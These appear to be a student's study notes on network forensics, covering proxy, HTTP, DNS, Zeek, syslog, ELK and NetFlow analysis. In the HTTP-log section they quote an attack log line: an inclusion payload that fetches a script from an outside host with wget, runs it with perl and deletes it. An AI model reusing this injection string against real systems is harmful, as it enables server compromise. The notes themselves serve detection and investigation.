Why network forensics? Identify TTPs (Tactics, Techniques, Procedures)
Occam’s Razor doesn’t always apply: Confuse the investigator (adv. Attacker’s deliberate false evidence OR unsophisticated suspect’s actions): Strategic objective.

Attacker dwell-time: Time between attacker first gained access to the company or system and attacker getting discovered or identified by the internal system.
-	This is decreasing with years pass by (which is good) | but still remains externally-identified (>6 months) (Law Enforcement, Researcher, Regulatory bodies, etc.)
-	Average 180 days in industry. 

Web Proxy servers: Traditionally for performance reasons | proxy server’s cache is valuable during IR when malware is deleted from infected system | Hardware and software based
Squid, Symantec ProxySG (Blue Coat), NGINX (reverse proxy), Forcepoint (Websense), Apache Traffic server (donated by Yahoo! in 2009), Zscaler (in cloud)
-	Squid Web Proxy: Free and Open Source
o	Configuration: /etc/squid/squid.conf 
	Network presence
	Access Controls
	Log and Cache parameters and Location
o	Log: /var/log/squid/*
o	Cache: /var/spool/squid/* (default: 100MB)
	refresh_pattern directive in squid.conf
o	Default listens on TCP port: 3128
o	Enable the ‘bump server feature’ for intercepting SSL/TLS
o	access.log defaults -> refer to picture ---------------------

Squid log example:
  1509038269.433   531 192.168.75.19 TCP_MISS/200     17746 GET http://www.nu.nl/ - DIRECT/62.69.184.21 text/html
  1509038295.705   246 192.168.75.19 TCP_REFRESH_HIT/304 303 GET http://www.nu.nl/ - DIRECT/62.69.184.21 -
Custom Log format can be specified in squid.conf (logformat directive)
By default, these are not logged: query strings (user privacy issue on key logger) | user-agent strings | Referral URLs | human-readable date/timestamp
If query strings needs to be logged, in the squid.conf (check with legal depart first):    strip_query_terms   off
Squid log analysis tools:
-	calamaris | sarg | squidview | etc.		http://www.squid-cache.org/Misc/log-analysis.html
For raw analysis of the squid log files, forensicator can use: 
-	bash, powershell, python, jq, grep, awk, sed, perl, etc.
e.g. $ date -u -d @epoch_time.ms	//can convert to UTC timezone and human readable date and time
	$ date -j -r epoch_time 	//on mac OS

To convert all timestamps on access.log file to human-readable at once (by searching for google.com text):
 $ grep google.com /var/log/squid/access.log | awk ‘{$1=strftime(“%F %T”, $1, 1); print $0}’

Log walkthrough process steps: planning -> evidence collection -> form hypotheses -> analyze evidence -> support/refute/refine hypotheses (repeat until stable)
1.	Check for websites access using the HTTP CONNECT method and filter for hostname in the URL.
grep -v " CONNECT " access.log | awk '{print $7}' | awk -F/ '{print $3}' | sort | uniq -c | sort -nr

2.	Assuming google.com is most used; using the word count, analyze the searches used by user
grep "google.com" access.log | grep complete | less

3.	Check other most visited sites (e.g. email and see if any emails were sent); confirm by checking on website
grep mail.com access.log

4.	Check all .gov sites in the log
grep \.gov access.log

5.	Re-order in chronological order to make a synthesis of the data

Cache walkthrough steps: has multiple cache directories when load balanced. Cache file names are 8 hex characters.	/var/spool/squid/2-hex/2-hex/8-hex
1.	Search from many cache files present in the directory, use railgrep: (-r recursive; -a treat all as ASCII; -i case insensitive; -l list file names, not full path; -F disable regexp parsing engine, increases efficiency (e.g. IP address)
grep -rail www.google.com *

2.	xxd <filename> or hexdump -C <filename>   //header and body (data) are separated by “0d 0a 0d 0a”
3.	strings -n 10 00/02/0000021D	//can also give the request or response content from cache files)

tcpdump: open-source / cross-platform / based on libpcap / Uses BPF syntax
  -c (capture first x number of packets from interface) | -s (capture first x bytes of packets from interface) |  -C (rotate pcap after file size reached, Ring capture) | -G (rotate pcap after nbr of seconds reached, needs timestamp format, Max count) e.g. -G 86400 (will rotate per day) -w outfile_%F.%T.pcap | -W (Limit nbr of rotated pcap files) | -F (load BPF from file, instead from cmd line)

PCAP file format:  TCP normal segment: 54 bytes (default snap length to capture) | 14 bytes of ethernet + 20 bytes each for IP and TCP header;
-	Magic bytes at beginning of the file: 0xd4c3b2a1 (endianness of system’s processor architecture might affect this value) | PCAP version: 2.4 & libpcap version: >= 1.1.1 | TZ in UTC = 0 (always) | Accuracy always 0 | Snapshot length | Many link types (type of media from which packets are acquired) pcap-linktype
pcap packet/frame header: timestamp seconds | timestamp microseconds | Length of captured packet | un-truncated length of packet data

pcapng: multiple interfaces capturing, expanded metadata fields with comments/statistics/DNS activity, more accurate timestamps | still in draft status RFC
$editcap -F pcap capture_file.pcapng capture_file.pcap

Partial or complete loss of packet capture happens at time with tcpdump due to CPU, and Storage limitations.
BPF: Layer 3-4 (ip,tcp,udp,icmp) | Layer 2-4 (ether,host,net,port) | Logic (and,or,not, ()) | Less common (vlan,portrange,gateway) | Qualifiers (src,dst) | byte offsets
-	$tcpdump “src host 192.168.0.10”		// src host, src port, dst net
-	$tcpdump “ether src 3C-6A-A7-EC-AB-7B”	// ether src, ether dst
gateway BPF can be used to detect packets sent to rogue MITM gateways
$capinfos -M -csd bigfile.pcap

Wireshark: GUI that decodes protocols (2000+ protocols); open-source / cross-platform; comes with tshark
“manuf” file (/usr/share/wireshark/manuf) is used to refer to the first 3 bytes of MAC address (vendor info) in Wireshark
Filters: == | and,or,not,() | contains (case-sensitive) | case-sensitive unless wrapper in lower() | matches
	e.g. tcp.port == 80 |  ip.src == 192.168.0.100
	Note: BPFs are significantly faster than that of Wireshark filters
On any field in section-2 of GUI, right-click on it and ‘apply filter’ or ‘prepare a filter’.
Filter syntax checking: Red (wrong), Yellow (deprecated), Green (correct) colors
	e.g. dns.a != <ip> is wrong 	| dns.a && !(dns.a == <ip>)  is correct
 Follow streams: TCP, UDP, HTTP, TLS	| Content in RED is request and BLUE is response
 Decode as alternate protocol: sneaky user trying to push one protocol over an alternate port in attempt to evade detection.
 Wireshark display filters allow filtering at higher layers than BPFs.

tshark: Wireshark’s fraternal console twin. If a file cannot be opened in wireshark, it cannot be opened in tshark.
    -r | -n | -Y (display filter from wireshark) | -T (output mode: fields, text, pdml) | -e (used with -T fields) | -G (form of grep)

Network Evidence Collection:
Corporate DHCP, DNS, Active Directory, Mail Server, User’s Laptop, Web proxy server, IDS, Switch, Router, Firewall
PCAP, NetFlow and Logs (Time sync is critical in Logs)
NetFlow: v5 (most common), v7, v9 | Open IETF standard & IPFIX extension | 


Ways to acquire evidence data:
1.	Enterprise Switch: Port mirroring / SPAN (Switch Port Analyzer) port: A software tap that duplicates packets from one or more ports or VLANS and sends to another port
a.	Switch already exists in companies, just need to setup the configuration (easy)! But higher speeds can hinder.
2.	Hardware / Virtual / Network Taps:  Dualcomm, Ninja Throwing Star Network Tap, AWS VPC Traffic monitoring
a.	Traffic is not dropped | Redundant and fail-safe | Installation process (required downtime) & cost is an issue | NetFlow can be generated using pmdcctd
3.	Internal NetFlow: Endpoint devices (workstations, servers, etc.) can perform NetFlow collection using fprobe, pmacct, nprobe | AWS VPC Flow, Azure NSG Flow Logs
4.	External sources: ISPs often collect NetFlow data, External DNS servers
Commercial solutions (evidence collection): Endace, LiveAction LiveCapture, NIKSUN NetDetector line, RSA NetWitness, etc.

Design considerations for building in-house solution for evidence acquiring: 
Links to be monitored | Out-of-band mgmt. | OS hardening | Trusted and sync system clock | Approved plans on when & how to use | Trained people

Network challenges and opportunities: Any changes to devices | NAT | Encryption | Tunnels & VPN (encapsulating traffic into another) | Optimizers (cache servers, CDNs, etc.) | Wireless | Cloud computing | IoT (huge volume of data)

# BOOK-2: HTTP Protocol
GET method is considered ‘idempotent’ -> same request issue later should result in same results, without making changes to content on server.
Headers in HTTP request and response are MOSTLY OPTIONAL (only first line in both is mandatory)
-	hostname: required for HTTP/1.1 request
Request: Request method -> Request String -> Protocol version
Response: Protocol version -> Response Code -> Response Phrase
•	Response protocol version should match that of request
•	Connection: Keep-Alive or close
•	Order of response headers:
o	Connection type | Server string | Content metadata (size, MIME type, Unicode charset, encoding, compression) | Date | Proxy caching directives (cache-control, Expires, ETag, Vary) | Redirection | Arbitrary X-* headers
HTTP status codes: 100=Continue | 200=OK | 206=partial content | 301=Moved Permanently | 302=Found | 400=Bad syntax | 401=Unauthorized | 403=Forbidden | 404=Not found | 407=Proxy Authn required | 500=Internal server error | 503=Service Unavailable | 511=Network Authn required
-	Long list of 4xx codes in logs indicates reconnaissance from attackers
-	Lot of 5xx codes + one 200 code + Lot of HTTP POST requests could be an SQL injection
-	 Cobalt strike pen test/attack platform could be identified w/ single extraneous space after HTTP response

CDNs use 3-letter airport code in HTTP response, indicating the location from which the content was sent.
-	Not based on physical location but based on network point of origin
-	X-Timer indicates varnish start and varnish end: Difference is in milliseconds

Short-Link request (amzn.com) makes 3xx redirection in response to full link (using Location: header)
Useful fields: Google Analytics cookies: utma / Urchin Tracking Module (UTM) / more used for advertisers
                __utma  //valid for 2 years (rolling timer, resets to 0 with every page visit).
	__utmb  // valid for 30 min 
	__utmz  // valid for 6 months (campaign tracker) -> tracks user path to site or page (search engine, bookmark or hyperlink from another site, etc.)
__utma=<domain_hash>.unique_userid/cookie_db_id.first_visit_time.previous_visit_time.current_visit_time.visit_count
__utmb=<domain_hash>.page_views_in_session.outbound_click_count.current_visit_time_started
__utmz=<domain_hash>.<campaign_visit_timestamp>.<visit_count>.<source_count>.<source data / url / utmcsr>
   click out-counter tells how many times user clicked on another site that is not the main site (10=0 hits and 9=1 hit and so on)
__utmv=custom site-defined variables
HubSpot cookies (more used for marketing purposes): 
__hstc=<domain_hash>.<utk_visitor_identity_value_in_hex>.<first_visit_timestamp>.<previous_visit_timestamp>.<current_visit_timestamp>.<number of visits>
-	2 years rolling expiry (hub spot tracking cookie: hstc)
hubspotutk=<utk_visitor_identity_value_in_hex>	//10 year lifetime
hsfirstvisit=<how visitor first arrived at URL>	||<timestamp>    (remove last 3 digits and convert)   //10 year lifetime

HTTP/2: HPACK compression | Fully multiplexed | Server can push data without client requesting it | Has QoS for prioritization
-	Can decrypt HTTP/2 using Mozilla’s NSS keylogging (SSLKEYLOGFILE environment variable)

HTTP profiling: Wireshark filter: “tcp.desegment_tcp_streams” is sometimes disabled when source evidence is corrupted. Note: tshark passes: “-C no_desegment_tcp” for this reason on every command.

To view user-agent string from squid_log_file from 5th position separated by tab space:
cat <squid_proxy_log_file> | awk -F"\t" '{print $5}' | sort | uniq -c | sort -nr

$tshark -n -C no_desegment_tcp -r <file>.pcap -T fields -e frame.time_delta_displayed -e frame.time -e http.request.uri -Y 'http.user_agent contains "<user_agent_string>" and http.request.uri contains "sugexp"'   //Google ajax searches

“There is no flag directly available in the HTTP fields that directly confirms human or automated request/response”
HTTP Logs: 
Provides website usage, error details, web activity (reconnaissance, attacks, compromise, post-exploitation, operations).

CLF: Common Log Format: Most basic log format: “NCSA Common format” (National Centre of Supercomputing Applications)
Client_IP<space>requesting_username<space>basic/digest_authenticated_user<space>time_req_received<space>”request_method<space>URI<space>http_protocol”<space>response_status_code<space>size_of_requested_object_excl_headers
-	Incase of virtual hosting, common_format+vhost format 

W3C extended/Combined format: Same NCSA common format + HTTP Referrer header (for suspicious traffic, “-“ when empty) + HTTP User-Agent string (malicious utilities or forged traffic)
-	Apache’s mod_headers function is used to manipulate the HTTP logs data

Apache: mod_log_forensic logging: https://httpd.apache.org/docs/2.4/mod/mod_log_forensic.html
-	Logging of all headers for each request the server handles
-	Has impact on performance and disk space utilization
-	Can be configured for specific virtual_host or web page or application
-	Starts with + or – sign and unique identifier as this can log similar multiple lines
-	This log contains decrypted data as SSL/TLS offloading is done at WAF or other proxy servers in the front
unique_request_id|request_method<space>request_string<space>protocol_version|request_headers

IIS Log file format: Can support both NCSA and W3C extended. Has its own format (comma-separated), by default.
requesting_ip, authenticated_user, date, time, instance/service name, server name, server_ip, milliseconds to server the request, bytes in request, bytes sent in response, http status code, windows return code, http req method, requested resource, get request parameters
-	Windows return code is OS generated error code (0 = all good) for process that served the request
IIS Centralized Binary Logging (CBL): Efficient for large/busy servers | CBL stores in local files | requires querying and parsing to get human-readable data | Microsoft log parser tool is good for this (SQL-like functionality to query with text, XML, CBL, and more); GUI front-end is Log Lizard (by SANS). Microsoft’s own GUI is: Log Parser Studio.
-	ODBC connector allows server to log to an SQL server database

HTTP Log File Analysis methods: Stored in plain text (mostly). Can use shell utilities (awk, sed, grep, cut, etc.).
When logs are stored in SQL DB, forensicator can use normal or advanced SQL queries.
Sample commands to analyze HTTP logs data: (W3C Extended or Combined format)
1.	Find all systems that requested a particular resource, aggregated by frequency and sort
$ sudo grep "\"GET /resource" access_log |  awk '{print $1}' | sort | uniq -c | sort -nr

2.	Find all resources requested by the specified system:
$ sudo grep "^1.2.3.4" access_log | awk '{print $7}' | sort | uniq -c | sort -nr

3.	Same as above, but group by hour of access:
$ sudo grep "^1.2.3.4" access_log | awk '{print $4,$7}'| sed -e 's/\[\([0-9]\{2\}\/[A-Za-z]\{3\}\/[0-9]\{4\}\):\([0-9]\{2\}\)[0-9:]\{6\} \(.*\)/\1 \2:00:00+ \3/' | sort | uniq -c | sort -nr

4.	Identify all requestors that triggered server errors, including the request URI:
$ sudo cat access_log | awk '{print $9,$1,$7}' | egrep "^5[0-9]{2}" | sort | uniq -c | sort -nr

Investigative value of HTTP logs: identify probing for vuln apps from search engines | SQLi attempts | See what bad IP accessed | Find RAT tools in use | Track attacker’s action using a RAT (even reconstruct uploaded malware)
e.g. 1. Shell execution attempts against PHPBB and SQLi against PHPNuke:
207.36.232.148 - - [28/Aug/2006:07:08:46 -0300] "GET /index.php/Artigos/modules/Forums/admin/admin_users.php?phpbb_root_path=http://paupal.info/folder/cmd1.gif?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14611 "-" "Mozilla/5.0"

      2.  Scan for specific version of phpMyAdmin:
119.60.29.230 - - [23/Feb/2013:09:18:45 -0500] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 304 "-" "-"

119.60.29.230 - - [23/Feb/2013:09:18:50 -0500] "GET //web/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 308 "-" "-"

DNS and its logs: Besides DHCP, the most necessary protocol for most functionality!
Record types: A, AAAA, NS, CNAME, MX, PTR, SRV, TXT, NULL, SSHFP, etc.
-	A response with NXDOMAIN indicates non-existent domain or hostname
UDP/53 but can fall over to TCP (for zone transfers / when response is > 512 bytes i.e. single datagram). However, with IPv6 and DNSSEC, it is still UDP although > 512 bytes. That’s because of DNS EDNS (extension) | Stateless (uses transaction ID field, 2-byte field to minimize collisions) | DNS compression is elegant engineering | DNS response includes query parameters and answers.
-	Helps in load balancing | reconfiguration at DNS can help upgrade systems without any downtime | newer content delivery networks ensure client is sent to server that is closest in terms of geography or network topology

To keep DNS responses under 512 bytes, a novel DNS compression algo that utilizes repetitive nature of DNS is used. Efficiently stores repeated hostnames.

DNS Servers are Distributed / Decentralized, Hierarchical, Both recursive and iterative with delegations.
DNS TTL: Time in seconds that can a DNS answer be considered fresh / so that it can keep in its cache.
A client PC requests for DNS record -> local DNS server consults its own configuration (13 root DNS servers) -> The referral is done based on TLD (.org, .com, .net, etc.) -> then actual domain based on TLD without any knowledge of client -> DNS answer / response is cached at every stage based on DNS TTL -> final response sent to requested client

DNS for Forensics: Pulse of n/w activity in one protocol / important evidence | Should not be fully outsourced to 8.8.8.8 | Block clients from direct external DNS access | DNS query logging (good) OR DNS pcap files (better) OR passive DNS logging & monitoring (best)
-	DNS query logging is a debug setting on DNS server | Has performance issues | Has no DNS response info
-	Passive logging via tap or spam port (mirroring): Has DNS response info in log https://github.com/gamelinux/passivedns
-	Microsoft’s Windows Event Trace Log (ETL) / Analytical Event Logging / In Hex https://github.com/nerdiosity/DNSplice (To quickly and easily parse client query events from ugly DNS logs for Microsoft Windows 2003/2008R2 (DNS debug log) to Windows 2012R2/2016 (DNS Analytical log) into a format (CSV) suitable for additional analysis or insertion into a larger timeline.)

passivedns tool runs on specific live network interface in demon mode | records for both successful case (-y) and NXDOMAIN / unsuccessful cases (-Y). This tool can also read from existing pcap file 
$passivedns -D -i ens33 -y -Y
$passivedns -r evidence.pcap -l /cases/for572/passivedns.txt -L /cases/for572/passivedns_nsdomain.txt

DNS as tunnel transport: 
-	Tunneling: DNS TXT record with large base64 data is suspicious! Also NULL records. Can contain 255 or 65535 bytes of data | Tunneling is often done on TCP (uses TXT and NULL records)
-	A “relay by default” protocol. TTL can facilitate low latency (to ensure there is no caching at proxy)
-	Need to audit / review both TCP and UDP port 53 for forensic purposes
Some tools that can perform DNS tunneling: Cobalt Strike, DNSlivery, XFLTReaT, DNScapy, Iodine

Fast-Flux DNS (Single): C2 hostname is resolved via series of compromised DNS servers (intermediate ones) that sends DNS ‘A’ record of evil.com, which acts as broker to actual C2 evil server. Has very low TTL value (<5 min) on each DNS server to ensure cache is deleted quickly. It becomes hard for n/w admin to keep blocking different compromised DNS server’s IP that resolves evil.com domain.
-	So actual evil.com domain / IP is blocked
Fast-Flux DNS (Double): Wraps inside another layer of redundancy. Double-flux returns ‘NS’ records of compromised DNS servers (instead of ‘A’ record). Still has low TTL | Protects both DNS and HTTP servers
-	Detecting fast-flux DNS: Wireshark display filters: dns.resp.ttl < 300 and dns.count.answers > 12
-	 Most effective way to detect is use of historical norms for DNS activity and set it as baseline to identify abnormality

DGAs (Domain Name Generation Algorithm): Uses date or pseudo-random key as seed to create many possible C2 domain/host names. Identify via heuristics, historical norms, threat intel
-	Can generate 250-50000 domains per day
-	Sometimes even ISPs don’t return NXDOMAIN even for legitimately non-existent domain
o	They direct to a search page, to get a share of ad/click revenue
-	When a forensicator want to detect this behavior, it is found that Google Chrome / Viscosity OpenVPN client, etc. does this for genuine reasons (to detect interception)
-	DGA example: CryptoLocker (family of ransomware):
o	7 TLDs (com|net|org|info|biz|ru|co.uk)
o	12-15 alpha characters per host name
o	Indefinitely attempts to contact C2 IP from created domains (~1000 per day)

Locally collected passive DNS usecases: Phased C2 | Outside DNS server attempts/usage | DNS rebinding | Heuristics to identify DGA or uncommon domains

DNS-over-TLS (DoT) (TCP 853, payloads are sent over a reused socket) and DNS-over-HTTPS (DoH) (query embedded into HTTPS, data encoded with an HTTP/2 GET request URI or POST request body) 
-	Godlua malware (first observation of DNS-over-HTTPS for malware concealment)
-	First two bytes for DNS-over-HTTPS are “00 00” (32 bytes data represented by hex)
o	In HTTP POST, it is sent in hex directly
o	In HTTP GET, it is base64 encoded of hex in /dns-query?dns=AAABBB…. (query parameter)

Mitigations/Protections: DoT can be mitigated with n/w firewalls | DoH can be mitigated with normal HTTPS heuristics
Punycode: DNS is ASCII-only protocol. Anything that starts with xn-- is a punycode. Look-alike hostnames.
e.g.    xn--<ascii>-<position_and_encoded_string>    //RFC3492 has actual encoding details

# Forensics Network Security Monitoring (NSM)
IDS: Reactive / Signature-based OR proactive / metadata logging
Main goal: Create “forensically ready” environment by collecting necessary evidences, before an incident or compromise was identified.

Zeek (not an IDS) as live or post-collection analysis platform OR Security Onion
Zeek: Designed as network traffic analysis system | Prioritizes visibility over signatures | Open source (Corelight)
-	Reads from live interface (inline or with tap/port mirror) OR from exiting pcap files / extensible / scalable / layer-7 stateful / for both small and large enterprises / built-in protocol analyzers / associates req and responses for session-level logging

Zeek writes out lot of log files: Table-separated (TSV) or JSON format (preferred)
  Network protocols:  conn.log (tcp/udp/icmp) | dns.log (passive) | http.log | rdp.log | smtp.log | smb_mapping.log (files reconstructed from smb activity)
  File Metadata: files.log | smb_files.log (hash value, timestamp, etc.) | x509.log / ssl.log | pe.log (portable/windows executable)
  Inventory: known_devices.log (mac address, etc.) | known_services.log | software.log (user-agent, etc.)
  Special cases: signatures.log | weird.log (expected observations) | intel.log | notice.log (TLS cert validation errors, brute force activity, etc.)
-	Log files are created only when there is data in pcap or a live capture at interface
-	weird.log is interesting for forensicator

By default, Zeek compresses log files every hour (so we need to check multiple log files to get full insight of attack)
Reading the Zeek log files:
$ zcat dns.17\:00\:00-18\:00\:00.log.gz | head -n 1 | jq '.'
 
-	uid: starts with C (indicating connection uid, can cross-reference in other log files with same id)

For http.log file:
-	file uids (fuids): Starting with F and can be referenced in files.log 

Parsing JSON text with jq: (jqplay.org is available both online and offline)
1.	Display field.1, field2 (base64 decode) & field3 (human-readable time) from JSON data where field=value
select(.field == “value”) | {“field.1”, field2: (.field2 | base64 -d), field3: (.field3 | todate)}

2.	To display json data with pretty print
cat <json_text> | jq ‘.’

zgrep is much faster than jq select.     e.g.  $time zgrep -h '"id.orig_h":"172.16.4.4"' * | jq '.' | wc -l 		is faster than 		            $time zcat * | jq 'select(."id.orig_h" == "172.16.4.4")' | wc -l
Zeek NSM: Signatures: Not a primary focus but possible for quick use (not a replacement for SNORT). 
  (regex)   (hex-encoded bytes)
Zeek also has rich scripting framework | can process specific events and write to log files. For example:
-	Look up hash values of observed files using online binary/file reputation services
-	IP addresses that change MAC address outside of specific threshold
-	DNS activity frequency reports
-	JA3 TLS client hash generation, etc.

Community ID string: Corelight developed it | unique flow designation value | Generated in Moloch (created at ingestion time and places it in SPI, Session Profile Information, metadata), Zeek (as external module), Elastic Beats, Suricata, etc. 		https://github.com/aol/moloch
version + “:” + base64(sha1(seed+source_ip+destination_ip+protocol+0x00+source_port+destination_port))
        1               :                                      0       			     layer_4 single_byte value padded with 0 byte

$community-id.py ftp-example.pcap
1385138294.266541 | 1:DCFv5LdDBtXfhmqfOFxcHVf1FbY= | 192.168.75.29 149.20.20.135 6 37028 21

Why NSM (investigative benefits)? Threat hunting / proactive measure to look for abnormalities, although IDS is in place / Forensic purposes (e.g. create and use specific signature patterns for investigation)

Zeek will ignore a session, when there are checksum failures in TCP/UDP. E.g. corrupted traffic.
By default, Zeek submits a SHA-1 hash to Team CYMRU Malware Hash Registry via DNS queries. 

Logging protocols and aggregation: 	
syslog: System Logging | Both a daemon (log on system) and network protocol (format) | Every org must have at least 1 year of syslog data | some regulations mandate logs to be archived in different locations | UDP port 514

Sources of syslog: routers, switches, IDS, UNIX/Linux/BSD systems, Wireless AP, Firewalls, etc. can send log events to another host using syslog protocol, even if they didn’t use syslog daemon internally. Even storage devices like NAS heads, and even raw drive sled banks for large SAN env. Generate syslog data. Even video surveillance camera can create syslog, when a change is detected in the field of view, alarm systems that log door/window events, motion detectors, etc.
-	Even Windows can ‘push’ proprietary log messages into syslog destination via 3rd party s/w. 

Target of syslog data (servers): *NIX systems | NAS devices | Aggregation & SIEM platforms like Splunk | Windows with 3rd party s/w (e.g. SolarWinds’ Kiwi Syslog Server or the Snare Server.

syslog format:  default (at the top) and enhanced formats.
default: date & time (generated by source system, without year, Time zone and milliseonds) | name of system that generated log messages (created by source system) | application name & process ID (and optionally an arbitrary string set by processes) | Log message (max length is determined by syslog daemon implementation)
-	If syslog is sent over IPv4 UDP, size is limited to 65,527 bytes. Many older syslog impl. cap actual message at 1024 bytes.
enhanced: <facility + severity = PRI> | date and time in ISO8601/RFC3339 format (include year and time zone)

Generally, facility (source) and severity are NOT logged. 
-	Facility: kernel, user, mail, printer, uucp, ftp, cron, local[0-7], etc.	(local7 is used for DHCP messages)
-	Severity: emergency, alert, critical, error, warning, notice, info, debug, etc.
Can convert facility+severity into one integer: (facility x 8) + severity = PRI (priority value, 8-byte integer)
Return (from integer): floor((PRI / 8)) = facility   AND	PRI mod 8 = severity
Full list of syslog facilities from RFC5424:
Number-keyword-Facility
0-kern-kernel messages | 1-user-user level messages | 2-mail-mail system | 3-daemon-system daemons | 4-auth-security/authz messages | 5-syslog-messages generated by internal syslogd | 6-lpr-line printer subsystem | 7-news-network news subsystem | 8-uucp-UUCP subsystem | 9-N/A-clock daemon | 10-authpriv-security/authz messages | 11-ftp-FTP daemon | 12-N/A-NTP subsystem | 13-N/A-log audit | 14-N/A-log audit | 15-cron-clock daemon (scheduler) | 16-local0-local use | 17-local1-local use | 18-local2-local use | 19-local3-local use | 20-local4-local use | 21-local5-local use | 22-local6-local use | 23-local7-local use

Number-Keyword-Severity
0-emerg/panic-Emergency: System is unusable | 1-alert-Alert: Action must be taken immediately | 2-crit-Critical: Critical conditions | 3-err/error-Error: error conditions | 4-warning/warn-Warning: warning conditions | 5-notice-Notice: Normal but significant condition | 6-info-Informational: Informational messages | 7-debug-Debug: Debug-level messages

rsyslog and syslog-ng: rsyslog daemon is default included in most *NIX. rsyslog has same config file as legacy syslog systems. syslog-ng requires another configuration file (& has more granular filtering/parsing). Both can queue messages (RabbitMQ, ZeroMQ, Apache Kafka) when collector server is unavailable. 
rsyslog configuration file (rsyslog.conf): “facility.severity” selectors decide the actions (e.g. where to log)
e.g. 	kernel.!notice	= All kernel messages with severity anything else than notice.
	*.info		= Any facility with severity info message or higher
	(any severity mentioned is considered as that level or anything above it)
	@ is used to push messages to remote machine via UDP protocol
	^ is used to push messages to an executable and a template name
Multiple log formats means the same log can be written multiple times
/var/log/messages | /var/log/secure | /var/log/maillog | /var/log/cron | /var/log/dhcp.log | /var/log/named.log | /var/log/clamd_scans.log | consoles and login sessions | /usr/local/bin/sms_send.py

Windows event logs in evtx format | Windows event forwarding allows sending these logs to remote server (via group policy) | Built-in forwarding (subscribe and push OR poll and pull), collecting, relaying | On the collector server, we can view via Event Viewer GUI or via API access | ForwardedEvents.evtx
-	For mixed env., “Log-to-syslog” bridge is used or ‘log shippers’ => 3rd party solutions (flexible, universal)
-	Splunk (proprietary forwarding protocol) can send from Windows to Linux 
-	Windows has NTSyslog that runs as NT 4.0 or Windows 2000 service – useful for legacy platforms
-	Snare, Winlogbeat (Elastic’s beat shippers (tiny agents) used with Elastic Stack, can read 30 different sources and sends info JSON format)
o	Elastic beats source types: raw files/Filebeat | Windows event logs/Winlogbeat | System status/Metricbeat, etc.
Shortfalls of log data: network device volatile data lost at reboot/crash/corruption | distributed log storage makes correlation difficult | Multiple log formats, need multiple tools | Log collection itself is massive task

[SOLUTION] Real-time networked log data: Prevents covering log tracks by attackers | Centralized analysis | Allows concurrent access to log data.
RELP: Reliable Event Logging Protocol: dev by same team as rsyslog | Absolute assurance that each log message was delivered to intended destination | TLS encryption supported as well

Comprehensive Log Aggregation: SIEM tools (Splunk, Arc Sight, Solar Winds, Tenable, QRadar), read from n/w (syslog or shippers), SNMP traps, NetFlow, Bulk file Ingest | Enhanced Aggregators (Elastic Stack, SOF-ELK, ELSA, Splunk, LogRhythm), Input format is user-definable for custom logs.
-	ELSA: Enterprise Log Search and Archive (free) uses XML-based structure to import and enrich logs
-	Logstash uses “grok” pattern-matching syntax (grok debugger tool, now part of Kibana)

Elastic Stack + SOF-ELK platform: ELKB: 3 core components + log shippers
-	Elastic Search: search/analytics engine | NoSQL | fast/scalable search | document-centric store (key/value)
-	Logstash: Reads i/p data & transforms -> Data ingest, parse, normalize, enrichment -> Transfer to remote
-	Kibana: Generic data analytic frontend | Complex dashboards and visualization
-	Beats: log shippers for various data types | raw-log files to system-level process statistics
ELKB Pros: Powerful & Scalable | FOSS | Plugin-centric, Community | Big-data platform (besides DFIR & SIEM) | tailored data enrichment
Cons: Doesn’t parse or visualize data ‘out-of-box’ | Difficult to configure & maintain | Documentation is poor

Kibana: Uses Apache Lucene syntax for search/filter
fieldname:value or value
Syntax is particular: space, case, etc. all matters
-	Elastic Search also uses Apache Lucene
Dashboards are created in GUI; stored in JSON.
-	Kibana lacks authn and access control features; thus requires a reverse proxy in front of it. 
-	Text searches are ‘tokenized’ (broken by delimiters . / - (.keyword is appended for non-tokenized)
Simple ‘text’ search covers both tokenized and non-tokenzied.
-	“Standby” search filters can be created (that are not active/applied and appear striped off)

Default timer on Kibana dashboard is to show last 15 min only. 

SOF-ELK (Sec Ops and Forensics ELK): VM, preconfigured with ELK components / parsers / dashboard | free
-	https://github.com/philhagen/sof-elk

Syslog (default or non-standard), HTTPD (combined/extended), Passive DNS (native or syslog format)
Zeek Logs, NetFlow (formatted to Logstash NetFlow codec handler), Kape (JSON, Kroll Artifact Parser and Extractor, suite of Windows Forensic tools).	       	Inputs to SOF-ELK
/logstash/syslog/yyyy | /logstash/httpd | /logstash/passivedns | /logstash/zeek  | /logstash/kape |
-	All the above in both disk mode (pre-recorded) or in Live mode

# BOOK-3: NetFlow, FTP, SMB (Microsoft Protocols)
Collection & Analysis:  WHY? => Privacy | Encryption | Duplication of data at diff locations | Heavy storage and hardware needed for pcap (small and medium enterprises cannot afford) | Analysis is difficult with large pcap
NetFlow ->
Statistical record of packets with common attributes: Source/Dest IP, Protocol, Source/Dest Port
-	No content | Just metadata | Start and stop times | Data volume sent | Unidirectional | Doesn’t know client and server
-	Version:5 / Still in use / But limited / IPv4, unidirectional, inflexible data structure
-	Version: 9 & IPFIX (IP Information Export, Version:10 from IETF, RFC7011), sFlow (IBM, Netgear, Alcatel Lucent, etc.), J-Flow (Juniper), AppFlow (Citrix), etc.
-	NetFlow equivalents: Zeek conn.log, AWS VPC Flow, etc.

Use in Forensics: Most talking IPs | Statistics | Suspected C2 nodes traffic | Traffic spikes (Beaconing or exfiltration) | Encryption of data is not an issue with NetFlow | Long term evidence collection (use in intel)

NetFlow architecture: Many Exporters (border and core routers, firewalls, switches, etc.) -> Collector & Flow storage (indexed and ready for processing) -> Analysis console (forensic)
-	All can be in one system (training purpose) – generally on Linux
-	Exporters use UDP to export data | Records can be forwarded to multiple collectors (for varied analysis)
o	SCTP (Stream Control Transmission protocol) is used to mitigate lost data risk (kind of configuration for receival at collector | exporter deletes the data once confirmed receival)

NetFlow v5 header: 

Autonomous sequence numbers (ASN)
Will help forensicator to track down
Data’s overall src, dst, and path.

Upto 30 records sent in single exchange
Header
Body

NetFlow v9 header: (works by templates | time limited to seconds | Export packet counts and not flows)

total 79 record types defined in RFC3954
(Details of fields are in book) 	IPFIX  nearly 500 field types.

“show ip cache flow” command will display records currently in cache (in Cisco environment).
-	Flow is inactive (when no data comes for 15 seconds) | Long flow (connection for 1800 seconds) | Flow for RST & FIN flag in TCP is observed.

Forensic Analyst console: browser based / thin client / client hosting server is same PC as NetFlow storage (to avoid lag) / Concurrent users limited by perf and license

